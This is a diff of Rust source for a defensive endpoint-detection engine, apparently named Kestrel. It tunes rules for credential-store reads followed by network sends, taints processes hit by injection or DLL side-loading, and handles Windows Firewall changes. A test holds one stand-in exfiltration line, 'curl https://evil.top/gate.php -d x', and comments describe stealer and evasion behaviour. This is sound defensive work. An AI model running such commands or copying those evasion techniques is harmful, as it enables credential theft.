+                        .is_some_and(|p| crate::legit_apps::provider_endpoint(p, &h));
+                    let own_ep = crate::legit_apps::dev_tool_endpoint(rp.signer.as_deref(), &h)
+                        || (vendor_backend
+                            && crate::legit_apps::dev_tool_endpoint(proc_.signer.as_deref(), &h));
+                    if own_ep || provider_ep {
+                        notes.push(format!("only developer-tool credential stores were read, by their own publisher's signed tool, and the connection went to that publisher's or provider's endpoint {h}"));
+                    } else {
+                        worst = worst.max(Severity::High);
+                        notes.push(format!("only developer-tool credential stores were read, by their own publisher's signed tool, but {h} is not that publisher's or the provider's endpoint (a private registry or API server, or theft); review"));
+                    }
+                }
+                if s.vendor_cfg_cred {
+                    let vendor_send = rg == proc_.guid || vendor_backend;
+                    if !vendor_send {
+                        worst = worst.max(Severity::High);
+                    }
+                    notes.push(
+                        "Steam's client configuration was read by a signed vendor service"
+                            .to_string(),
+                    );
+                }
+                if s.own_app_dpapi {
+                    notes.push("the app's own Electron safeStorage key was decrypted".to_string());
+                }
+                if s.own_folder_cred {
+                    if raw {
+                        full = true;
+                    } else {
+                        worst = worst.max(Severity::High);
+                        notes.push(format!("an app whose signer Kestrel cannot verify read the store in its own folder, then connected to {h}; review"));
+                    }
+                }
+                (!full).then(|| (worst, notes.join("; ")))
+            }
+            _ => None,
+        };
+        if let Some((sev, note)) = benign_verdict {
+            // Triage item 5 / review H4 / fix round 2026-10-25: benign reads
+            // to their own endpoints are Low Audit; to another named host
+            // High Audit; a raw IP or an exfiltration service never gets here.
             hit.mode_override = Some(RuleMode::Audit);
             hit.strong = false;
-            let vendor_send = rg == proc_.guid
-                || vendor_backend
-                || s.cloud_provider.is_some_and(|p| {
-                    host.as_deref()
-                        .is_some_and(|h| crate::legit_apps::provider_endpoint(p, h))
-                });
-            hit.severity = if (s.dev_tool_cred || s.vendor_cfg_cred) && !vendor_send {
-                Severity::High
-            } else {
-                Severity::Low
-            };
-            if s.dev_tool_cred {
-                hit.summary.push_str(" (only developer-tool credential stores such as kubeconfig, Docker or cloud CLI credentials were read, by a signed developer tool installed under Program Files; alert only)");
-            } else if s.vendor_cfg_cred && !(s.wam_cred || s.own_app_dpapi || s.ms_wam_cred) {
-                hit.summary.push_str(" (only Steam's client configuration was read, by a signed vendor service installed under Program Files; alert only)");
-            } else if s.ms_wam_cred {
-                hit.summary.push_str(&format!(
-                    " (only the Windows sign-in (WAM) token cache was read, by a Microsoft-signed app, and the connection went to Microsoft's own endpoint {}; alert only)",
-                    ms_host.as_deref().unwrap_or("")
-                ));
-            } else {
-                hit.summary.push_str(" (only the Windows sign-in (WAM) token cache and/or the app's own Electron safeStorage key were read, by a signed Program Files app; alert only)");
-            }
+            hit.severity = sev;
+            hit.summary.push_str(&format!(" ({note}; alert only)"));
+            // Own dedup key: a later full ST-04 of the same process (another
+            // destination) is a visible alert, not a silent re-hit action.
+            hit.dedup_key = Some(format!("{ST04}#benign"));
         } else if let Some((provider, h)) =
-            self.provider_destination(&rg, &rp, &proc_, host.as_deref())
+            self.provider_destination(&rg, &rp, proc_, host.as_deref())
         {
-            // 2026-10-22: only one cloud provider's developer-tool stores were
-            // read and the send went to that provider's own service endpoint
-            // (by DNS name, never by IP) from signed, non-Temp, untampered
-            // processes: SDK / CLI use (boto3 calling S3) looks exactly like
-            // this. High Audit, no kill or block; recorded, and any later read
-            // of another store or send elsewhere gets the full ST-04 (own
-            // dedup key so that alert is not swallowed).
+            // 2026-10-22: one provider's stores, its own endpoint, signed
+            // processes: SDK / CLI use. High Audit, no kill or block.
             hit.actions.clear();
             hit.escalation_ip = None;
             hit.mode_override = Some(RuleMode::Audit);
@@ -3985,6 +5005,30 @@ impl EngineState {
                 "{} read {phrase}, {who} {provider} ({h}) {delay} later; this is normal for SDK / CLI use but would also fit an attacker using the credentials; review",
                 describe(&rp)
             );
+        } else if self
+            .states
+            .get(&rg)
+            .is_some_and(|s| s.dpapi_chromium && !s.dpapi_named && !s.file_cred)
+            && !self.tree_keys(&rg).iter().any(|k| {
+                self.tree
+                    .get(k)
+                    .is_some_and(|c| c.members.iter().any(|m| m != &rg))
+            })
+        {
+            // Xeno (DETECTION-QUALITY.md section 5): the only secret is a
+            // DPAPI unprotect described "Chromium" (Electron's generic key
+            // description) and neither the reader nor its tree opened any
+            // credential store: a stealer must read the store whose key it
+            // decrypts, and that read gets the full response. High Audit, no
+            // containment, own dedup key (a later store read + send is not
+            // swallowed by this alert).
+            hit.mode_override = Some(RuleMode::Audit);
+            hit.strong = false;
+            hit.severity = Severity::High;
+            hit.actions.clear();
+            hit.escalation_ip = None;
+            hit.dedup_key = Some(format!("{ST04}#chromium-key"));
+            hit.summary.push_str(" (the only secret was a DPAPI key described \"Chromium\", the generic description of Electron apps' own key, and no credential store was opened by the process or its tree; review)");
         }
         hit.process = Some(rp);
         if rg != proc_.guid {
@@ -4002,7 +5046,7 @@ impl EngineState {
     /// sender are validly signed, outside Temp / Downloads / external media
     /// and not tampered. Returns (provider, host).
     fn provider_destination(
-        &self,
+        &mut self,
         rg: &ProcessGuid,
         reader: &ProcessInfo,
         sender: &ProcessInfo,
@@ -4014,6 +5058,23 @@ impl EngineState {
             return None;
         }
         let provider = s.cloud_provider?;
+        // Fix round 2026-10-25 (corpus `script_shai_hulud_aws_secrets_manager`):
+        // never for package-manager install scripts, and never for a sweep
+        // (three or more distinct service hosts of the provider: regions /
+        // services enumerated with the stolen keys).
+        if self.package_install_tree(reader) || self.package_install_tree(sender) {
+            return None;
+        }
+        if crate::legit_apps::provider_endpoint(provider, h) {
+            let hl = h.trim().trim_end_matches('.').to_ascii_lowercase();
+            let st = self.state(rg, reader.start_ts.max(0));
+            if !st.provider_hosts.contains(&hl) && st.provider_hosts.len() < 16 {
+                st.provider_hosts.push(hl);
+            }
+            if st.provider_hosts.len() >= 3 {
+                return None;
+            }
+        }
         (crate::legit_apps::provider_endpoint(provider, h)
             && crate::legit_apps::provider_allowance_ok(
                 reader,
@@ -4053,7 +5114,8 @@ impl EngineState {
             }
         }
         let proc_ = self.proc_info(e);
-        let browser = is_browser_image(&proc_.image) && !is_untrusted_location_or_signature(&proc_);
+        let browser =
+            identity::genuine_browser(&proc_, self.system_drive, self.tainted(&proc_.guid));
         if let Some(h) = self.iocs.by_domain(&q).cloned() {
             if h.action == IocAction::Allow {
                 return;
@@ -4103,11 +5165,59 @@ impl EngineState {
         let known_target = browser_target
             || crate::legit_apps::app_at_location(&t.target_image, self.system_drive).is_some()
             || crate::legit_apps::in_program_files(&t.target_image, self.system_drive);
-        if !known_target || self.is_agent_owned(&e.guid) || e.pid == 0 || e.pid == 4 {
+        if self.is_agent_owned(&e.guid) || e.pid == 0 || e.pid == 4 {
             return;
         }
         let src = self.proc_info(e);
-        if is_browser_image(&src.image) && !is_untrusted_location_or_signature(&src) {
+        let src_tainted = self.tainted(&src.guid);
+        // Fix round 2026-10-25 (corpus finding 1, taint): any process that
+        // receives a remote thread, a thread-context change or a debugger,
+        // or a write / create-thread handle (VM_WRITE 0x20, CREATE_THREAD
+        // 0x2) from an untrusted or itself tainted actor, is tainted: it
+        // loses every allowance and owner status, Windows binaries included
+        // (credwiz, OpenWith, explorer, dllhost hosting a stealer). Not from
+        // an unknown actor (no image), not the process itself, not an app
+        // opening the WebView2 it hosts, not a benign security product.
+        {
+            let target_guid = t
+                .target_guid
+                .clone()
+                .or_else(|| self.table.by_pid(t.target_pid).map(|p| p.guid.clone()));
+            let untrusted_src = (Self::untrusted_actor(&src) || src_tainted)
+                && !src.image.is_empty()
+                && !Self::is_benign_av(&src);
+            let taint = match &e.data {
+                EventData::RemoteThread(_)
+                | EventData::ThreadContext(_)
+                | EventData::DebugAttach(_) => {
+                    !self.protected(&src)
+                        && !Self::is_benign_av(&src)
+                        && (known_target || untrusted_src)
+                }
+                EventData::ProcessAccess(_) => {
+                    let mask = if known_target {
+                        0x2 | 0x8 | 0x20
+                    } else {
+                        0x2 | 0x20
+                    };
+                    t.granted_access & mask != 0
+                        // A refused open (LSA protection, anti-cheat probes)
+                        // wrote nothing.
+                        && t.return_code == 0
+                        && untrusted_src
+                        && !(file_name_lower(&t.target_image) == "msedgewebview2.exe"
+                            && self.hosts_webview(&src, t))
+                }
+                _ => false,
+            };
+            if let Some(g) = target_guid.filter(|g| taint && *g != src.guid) {
+                self.taint(g);
+            }
+        }
+        if !known_target {
+            return;
+        }
+        if identity::genuine_browser(&src, self.system_drive, src_tainted) {
             return; // browser broker / children
         }
         if let EventData::ProcessAccess(_) = &e.data {
@@ -4118,32 +5228,13 @@ impl EngineState {
                 }
             }
         }
-        // Remember a browser that someone injected into / wrote to /
-        // debugged: it is never a genuine ST-16 importer afterwards.
-        let tampering = match &e.data {
-            EventData::RemoteThread(_)
-            | EventData::ThreadContext(_)
-            | EventData::DebugAttach(_) => !self.protected(&src) && !Self::is_benign_av(&src),
-            EventData::ProcessAccess(_) => {
-                t.granted_access & (0x2 | 0x8 | 0x20) != 0
-                    && Self::untrusted_actor(&src)
-                    && !Self::is_benign_av(&src)
-            }
-            _ => false,
-        };
-        if tampering {
-            let target = t
-                .target_guid
-                .clone()
-                .or_else(|| self.table.by_pid(t.target_pid).map(|p| p.guid.clone()));
-            if let Some(g) = target {
-                if self.tampered.len() >= 4096 {
-                    self.tampered.clear();
-                }
-                self.tampered.insert(g);
-            }
-        }
-        if !browser_target || !Self::untrusted_actor(&src) || Self::is_benign_av(&src) {
+        // ST-07 actor: untrusted, or itself tampered with (corpus
+        // `stealer_deerstealer_xfiles`: a validly signed host in ProgramData
+        // that a side-loaded DLL process injected into).
+        if !browser_target
+            || !(Self::untrusted_actor(&src) || src_tainted)
+            || Self::is_benign_av(&src)
+        {
             return;
         }
         let tname = crate::paths::file_name(&t.target_image).to_string();
@@ -4216,13 +5307,25 @@ impl EngineState {
         {
             return false;
         }
-        let Some(tp) = t
+        // FP-05 (fix round 2026-10-25): an MSIX app (image in its own
+        // WindowsApps package folder, TrustedInstaller-only; the package
+        // signature is verified at install, files often carry no Authenticode
+        // of their own) hosting WebView2. WhatsApp's background
+        // `WhatsApp.Root.exe` opens the WebView2 processes of its sibling
+        // `WhatsApp.exe`. An invalid signature never qualifies.
+        let src_family = crate::paths::msix_package_family(&src.image, self.system_drive)
+            .filter(|_| src.signed != SignatureState::Invalid);
+        let tp = t
             .target_guid
             .as_ref()
             .and_then(|g| self.table.get(g))
-            .or_else(|| self.table.by_pid(t.target_pid))
-        else {
-            return false;
+            .or_else(|| self.table.by_pid(t.target_pid));
+        let Some(tp) = tp else {
+            // The WebView2 predates the agent: only a packaged host's open of
+            // a WebView2 from the Edge WebView install tree.
+            return src_family.is_some()
+                && crate::legit_apps::program_files_rest(&t.target_image, self.system_drive)
+                    .is_some_and(|r| r.starts_with(r"\microsoft\edgewebview\application\"));
         };
         if !file_name_lower(&tp.image).eq("msedgewebview2.exe")
             || crate::legit_apps::is_remote_controlled(&tp.cmdline)
@@ -4258,12 +5361,23 @@ impl EngineState {
             if pp.guid == src.guid {
                 return true;
             }
+            // FP-05: launched by another process of the opener's own package.
+            if src_family.is_some()
+                && crate::paths::msix_package_family(&pp.image, self.system_drive) == src_family
+            {
+                return true;
+            }
             if !file_name_lower(&pp.image).eq("msedgewebview2.exe") {
                 break;
             }
             cur = self.table.parent_of(pp);
         }
-        false
+        // The WebView2's launcher is gone (or predates the agent): a packaged
+        // host and a WebView2 from the Edge WebView install tree.
+        cur.is_none()
+            && src_family.is_some()
+            && crate::legit_apps::program_files_rest(&tp.image, self.system_drive)
+                .is_some_and(|r| r.starts_with(r"\microsoft\edgewebview\application\"))
     }
 
     // ------------------------------------------------------------------
@@ -4281,13 +5395,40 @@ impl EngineState {
         let is_nss = dll == "nss3.dll";
         let is_sideload = SIDELOAD_DLLS.contains(&dll.as_str());
         let bad_sig = matches!(signed, SignatureState::Unsigned | SignatureState::Invalid);
-        if !is_nss && !is_sideload && !bad_sig {
+        let maybe_sideload = signed == SignatureState::Unknown
+            && (SIDELOAD_SYSTEM_DLLS.contains(&dll.as_str())
+                || CHROMIUM_CORE_DLLS.contains(&dll.as_str()));
+        if !is_nss && !is_sideload && !bad_sig && !maybe_sideload {
             return;
         }
         if self.is_agent_owned(&e.guid) || e.pid == 0 || e.pid == 4 {
             return;
         }
         let proc_ = self.proc_info(e);
+        // Fix round 2026-10-25 (taint by side-loading; corpus
+        // `evasion_chrome_copy_sideload`, `evasion_keepass_named_benign_reader`,
+        // `evasion_office_xll_wam_raw_ip`, `stealer_deerstealer_xfiles`): a
+        // validly signed process that loads an unsigned / invalidly signed
+        // module from a user-writable or unclassified folder (not its own
+        // image) is no longer the application it was signed as.
+        // Red-team round 2: the sensor's first load of a freshly dropped DLL
+        // can carry `unknown` (non-blocking enrichment). An unknown module
+        // with a classic side-load name (a Windows DLL a program loads from
+        // its own folder first) or a Chromium core DLL outside its version
+        // folder taints too.
+        let unknown_sideload = signed == SignatureState::Unknown
+            && (SIDELOAD_SYSTEM_DLLS.contains(&dll.as_str())
+                || (CHROMIUM_CORE_DLLS.contains(&dll.as_str()) && !in_version_dir(path)));
+        if (bad_sig || unknown_sideload)
+            && proc_.signed == SignatureState::Valid
+            && crate::table::image_key(path) != crate::table::image_key(&proc_.image)
+            && !matches!(
+                path_class_of(path, self.system_drive),
+                PathClass::System | PathClass::Windows | PathClass::ProgramFiles
+            )
+        {
+            self.taint(proc_.guid.clone());
+        }
         let pname = file_name_lower(&proc_.image);
         let dll_dl = driveless(path);
 
@@ -4589,8 +5730,57 @@ impl EngineState {
             ),
         );
         hit.tamper = true;
+        if kind == TamperKind::WfpFilterChange && self.os_firewall_refresh(detail) {
+            // FP-10 (fix round 2026-10-25): Windows Firewall / BFE replacing
+            // its own default filters. Kept visible, Low Audit.
+            hit.severity = Severity::Low;
+            hit.mode_override = Some(RuleMode::Audit);
+            hit.summary.push_str(" — Windows Firewall / BFE refreshing its own default filters (built-in BFE provider or Defender's `windefend_*` filter added by a Windows service); review only if unexpected");
+        }
         self.state(&e.guid, e.ts).add_evidence(e);
         self.emit(e, hit);
+    }
+
+    /// FP-10: a WFP change report (`kestrel-win` `wfp_tamper` text:
+    /// "WFP filter '<name>' changed at <layer> by pid <pid> (provider
+    /// '<provider name>' <key>, change <type>, action <action>)") that is
+    /// Windows Firewall's own refresh: change type Add (`%%16384`), and
+    /// either the provider is BFE's built-in one (`@bfe.dll,...`) or the
+    /// filter is Defender's `windefend_*` with no provider; and the changing
+    /// process, when Kestrel knows it, is a trusted, untampered Windows
+    /// binary (an EDR-silencer tool naming its filter `windefend_x` runs as
+    /// its own image). Kestrel's own objects are reported differently and
+    /// never match.
+    fn os_firewall_refresh(&self, detail: &str) -> bool {
+        let d = detail.to_ascii_lowercase();
+        let Some(name) = d
+            .strip_prefix("wfp filter '")
+            .and_then(|r| r.split_once('\''))
+            .map(|(n, _)| n.to_string())
+        else {
+            return false;
+        };
+        if !d.contains("change %%16384") {
+            return false;
+        }
+        let bfe = d.contains("provider '@bfe.dll,");
+        let windefend = name.starts_with("windefend_")
+            && d.contains("provider '-' {00000000-0000-0000-0000-000000000000}");
+        if !(bfe || windefend) {
+            return false;
+        }
+        let pid = d
+            .split_once(" by pid ")
+            .and_then(|(_, r)| r.split_whitespace().next())
+            .and_then(|p| p.parse::<u32>().ok());
+        match pid.and_then(|p| self.table.by_pid(p)) {
+            Some(p) => {
+                p.image.is_empty()
+                    || (Self::system_trusted(p) && !self.tainted(&p.guid))
+                    || self.protected(p)
+            }
+            None => true,
+        }
     }
 
     // ------------------------------------------------------------------
@@ -4998,5 +6188,66 @@ mod tests {
         assert!(iocs
             .by_url_in("curl https://evil.top/gate.php -d x")
             .is_some());
+    }
+
+    /// Review of the 1.1.7 integration, L1: a flood of tainted live
+    /// processes never un-taints an earlier one (the set used to be
+    /// cleared when full); exited processes are what gets pruned.
+    #[test]
+    fn taint_overflow_never_untaints_live_processes_l1() {
+        let host = HostContext {
+            boot_id: "b".into(),
+            hostname: "h".into(),
+            agent_image: r"C:\Program Files\Kestrel\kestrel-agent.exe".into(),
+            agent_pid: 0,
+            server_ips: vec![],
+            system_drive: Some('c'),
+        };
+        let mut e = EngineState::new(host, Policy::default(), RuleBundle::default()).unwrap();
+        let mk = |i: usize| ProcessInfo {
+            guid: ProcessGuid(format!("p{i}")),
+            pid: 10 + i as u32,
+            ppid: 1,
+            parent_guid: None,
+            image: r"C:\Users\a\AppData\Local\Temp\x.exe".into(),
+            cmdline: String::new(),
+            user: None,
+            integrity: None,
+            start_ts: i as i64,
+            exit_ts: None,
+            signer: None,
+            signed: SignatureState::Unsigned,
+            sha256: None,
+            motw_zone: None,
+            file_size: None,
+            path_class: PathClass::Temp,
+        };
+        let chrome = ProcessGuid("chrome".into());
+        e.table.insert(ProcessInfo {
+            guid: chrome.clone(),
+            image: r"C:\Program Files\Google\Chrome\Application\chrome.exe".into(),
+            path_class: PathClass::ProgramFiles,
+            ..mk(0)
+        });
+        e.taint(chrome.clone());
+        // Twice the old cap of live tainted processes.
+        let n = MAX_TAINTED * 2 + 10;
+        for i in 1..=n {
+            e.table.insert(mk(i));
+            e.taint(ProcessGuid(format!("p{i}")));
+        }
+        assert!(e.tainted(&chrome), "the injected browser stays tainted");
+        assert!(e.tainted(&ProcessGuid("p1".into())));
+        assert!(e.tainted(&ProcessGuid(format!("p{n}"))));
+        assert_eq!(e.tainted_len(), n + 1);
+        for i in 1..=n {
+            e.table.mark_exit(&ProcessGuid(format!("p{i}")), 1);
+        }
+        // The next prune drops the exited ones only.
+        for i in 0..=e.taint_prune_at {
+            e.taint(ProcessGuid(format!("q{i}")));
+        }
+        assert!(e.tainted(&chrome));
+        assert!(!e.tainted(&ProcessGuid("p1".into())));
     }
 }
